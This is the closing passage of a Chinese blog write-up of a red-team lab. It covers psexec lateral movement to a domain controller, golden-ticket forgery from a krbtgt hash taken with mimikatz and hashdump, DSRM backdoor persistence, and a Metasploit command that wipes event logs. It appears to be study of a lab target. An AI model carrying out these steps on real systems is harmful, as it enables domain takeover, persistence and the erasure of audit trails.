+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685975863551-bf66f70e-e34c-4f6f-b80a-ba990878af76.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=275&id=u16139ee9&originHeight=550&originWidth=2243&originalType=binary&ratio=2&rotation=0&showTitle=false&size=81136&status=done&style=none&taskId=uf81b12bd-a14d-44f4-b4fd-940051a4d6f&title=&width=1121.5" alt="image.png"><br>再次使用psexec <br>结果这里还是不行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685976651753-4a3f66a7-3087-4f15-aa5f-513764efc00f.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=748&id=u0b6a0cd0&originHeight=1495&originWidth=2465&originalType=binary&ratio=2&rotation=0&showTitle=false&size=243449&status=done&style=none&taskId=u73fa0110-aeae-4124-a898-3ea672db0df&title=&width=1232.5" alt="image.png"><br>为啥啊 啊啊<br><a name="T5Mz5"></a></p>
+<h2><span id="cs-使用psexec-拿下域控">CS 使用Psexec 拿下域控</span></h2><p>使用CS<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685976930509-5a996e53-2c0c-4ec3-9fe0-af2f148dcd2e.png#averageHue=%23080707&clientId=u8932858d-75dc-4&from=paste&height=663&id=u68d71e62&originHeight=1326&originWidth=2734&originalType=binary&ratio=2&rotation=0&showTitle=false&size=64686&status=done&style=none&taskId=ud46d9b29-e0bd-4e2f-879e-25fbfcf5694&title=&width=1367" alt="image.png"><br>直接使用psexec 横向<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685977246777-7895e3f0-4c0a-42a0-8d90-ab190cbbad66.png#averageHue=%23abd3be&clientId=u8932858d-75dc-4&from=paste&height=409&id=u448f699f&originHeight=818&originWidth=1155&originalType=binary&ratio=2&rotation=0&showTitle=false&size=77837&status=done&style=none&taskId=u7e736b17-93bf-446c-9f2c-903d3617323&title=&width=577.5" alt="image.png"><br>获取到权限 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1685977263720-e7741295-e53d-482f-926f-70c8e8ffdf1c.png#averageHue=%23515150&clientId=u8932858d-75dc-4&from=paste&height=779&id=ud71677ca&originHeight=1558&originWidth=2867&originalType=binary&ratio=2&rotation=0&showTitle=false&size=177706&status=done&style=none&taskId=uc9dcd6ff-92b7-4702-957f-d898fe352cc&title=&width=1433.5" alt="image.png"><br>我也不知道为啥这里的msf 就不能成功建立连接呢 奇奇怪怪 ？？？&#x2F;&#x2F;&#x2F;</p>
+<p><a name="DU29e"></a></p>
+<h2><span id="权限维持">权限维持</span></h2><p><a name="dLv2S"></a></p>
+<h3><span id="黄金票据">黄金票据</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">金票和银票的区别<br>获取的权限不同<br>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS<br><br>认证流程不同<br>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server<br><br>加密方式不同<br>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密<br></code></pre></td></tr></table></figure>
+<p>在DC上使用mimikatz 抓取 黄金票据所需要的信息 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1、域名称 <br>2、域的SID值 <br>3、域的KRBTGT账号的HASH <br>4、伪造任意用户名 （获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686034396396-6d0bb9c6-20f4-4466-bdd3-8f94fac5ee80.png#averageHue=%23080707&clientId=u8932858d-75dc-4&from=paste&height=417&id=u59061c29&originHeight=833&originWidth=1826&originalType=binary&ratio=2&rotation=0&showTitle=false&size=67720&status=done&style=none&taskId=u085cdee8-65a0-4b98-b002-bb3911838c9&title=&width=913" alt="image.png"><br>3、域的KRBTGT账号的HASH  这个可以使用hashdump <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686034567654-dea6bb60-1f56-4ad4-bc24-bf585245fc43.png#averageHue=%230f0e0d&clientId=u8932858d-75dc-4&from=paste&height=255&id=u0441b7db&originHeight=509&originWidth=1690&originalType=binary&ratio=2&rotation=0&showTitle=false&size=72297&status=done&style=none&taskId=udc02b1be-c5f6-4854-928b-5898461c34e&title=&width=845" alt="image.png"><br>制作票据的内容都准备好了 ，先测试没有票据是否能 获取到DC c盘的内容<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686035494189-5c861556-807f-42c0-b397-7432871ba580.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=84&id=u1591bc06&originHeight=167&originWidth=987&originalType=binary&ratio=2&rotation=0&showTitle=false&size=20129&status=done&style=none&taskId=u36fee862-6418-4fdb-8cb7-b491fc1ff63&title=&width=493.5" alt="image.png"><br>显然是拒绝访问的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686035633720-7c84c2b2-3eb9-4071-a174-e727ea887818.png#averageHue=%231f1d1b&clientId=u8932858d-75dc-4&from=paste&height=681&id=u403c2355&originHeight=1362&originWidth=2157&originalType=binary&ratio=2&rotation=0&showTitle=false&size=262063&status=done&style=none&taskId=u32c5d8f6-2ac8-4232-a814-129304b85d7&title=&width=1078.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686035643066-9cda07c2-ce11-4103-9e71-ec297be705c5.png#averageHue=%23050504&clientId=u8932858d-75dc-4&from=paste&height=414&id=ue9a8a95c&originHeight=827&originWidth=2852&originalType=binary&ratio=2&rotation=0&showTitle=false&size=93967&status=done&style=none&taskId=u57b9c834-84ab-416e-ba2a-1f0a73d510c&title=&width=1426" alt="image.png"><br>现在再验证是否可以<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686035924882-4a8e3d4e-e3bf-434b-9571-0a1b070d586c.png#averageHue=%2317181a&clientId=u8932858d-75dc-4&from=paste&height=647&id=uc5b3c0a0&originHeight=1293&originWidth=2106&originalType=binary&ratio=2&rotation=0&showTitle=false&size=215987&status=done&style=none&taskId=u0075900a-0784-4281-aa9d-c2ff9443f9f&title=&width=1053" alt="image.png"><br>成功获取到DC C盘的内容了  （这里要用administrator 这个用户或者权限才可以，我一开始是system权限是获取不到了 。说的可能不太对 ，但也就那意思）</p>
+<p><a name="UQN60"></a></p>
+<h3><span id="dsrm-后门">DSRM 后门</span></h3><p>DSRM是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账号(也就是DSRM账号)。DSRM的用途是：允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行 ntdsutil 命令。<br>在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。我们知道，每个DC都有本地管理员(administrator)账号和密码（与域管理员账号密码不同）。DSRM账号可以作为每个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。<br><strong>注意：该类持久化操作适用的服务器版本：Windows Server 2008及以后版本的Windows服务器。</strong><br>在域控制器上，DSRM账号的表现形式是本地的管理员 Administrator 用户，也就是说本地管理员 Administrator 用户等于DSRM账号。<br>主要了解了下这个后门<br>这个后门可以参考 ：  <br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RViKCbpYqBYYDofpHLTCKA">https://mp.weixin.qq.com/s/RViKCbpYqBYYDofpHLTCKA</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252963.html">https://www.freebuf.com/articles/web/252963.html</a></p>
+<p><a name="bqiAY"></a></p>
+<h3><span id="metasploit-清理">Metasploit  清理</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run event_manager -i          #查看事件日志<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686037196163-7cb60c66-cbf4-4075-a251-886d9065f4f6.png#averageHue=%2318191b&clientId=u8932858d-75dc-4&from=paste&height=330&id=ueee7b186&originHeight=660&originWidth=1112&originalType=binary&ratio=2&rotation=0&showTitle=false&size=88469&status=done&style=none&taskId=ueed52c4a-1a6b-4153-8294-bd8ecf6e3b9&title=&width=556" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run event_manager -c            #清除事件日志（包括六种日志类型）<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1686037242409-d88e88d8-bd39-4aba-b7f4-32dd37e0cd84.png#averageHue=%2318191c&clientId=u8932858d-75dc-4&from=paste&height=482&id=u1bdf06f8&originHeight=964&originWidth=1361&originalType=binary&ratio=2&rotation=0&showTitle=false&size=145270&status=done&style=none&taskId=u177cd021-2fc3-46b7-a595-3b1ce976514&title=&width=680.5" alt="image.png"></p>
+<p>参考 ： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">票据 ：<br>https://www.adminxe.com/3643.html<br>https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/<br>Metasploit PSExec执行报错大全<br>http://www.hackdig.com/11/hack-195928.htm<br>权限维持：<br>https://www.freebuf.com/articles/web/252963.html<br>sc命令：<br>https://blog.51cto.com/hukunlin/235229<br></code></pre></td></tr></table></figure>
+
+<p>完结 🥳  <br>这个靶机 ，不算难，就两台靶机 ，但是我看了其他师傅的wp ，发现没有人找出这个add.php 的后门 <br>可能是直接利用TP5 漏洞 ，就不管了 ，（该做的信息搜集还得做啊😜 ），后面的那个DSRM后门，没有进行复现，我会再去看看 权限维持这个点 。😉</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/07/20/ATT&CK(%E4%B8%83)/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>ATT&CK红队评估(七)</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/05/25/ATT&CK(%E4%B8%89)/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      ATT&CK红队评估(三)
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a><a href="/tags/ThinkPHP5-%E6%BC%8F%E6%B4%9E/" class="post-tag">#ThinkPHP5 漏洞</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
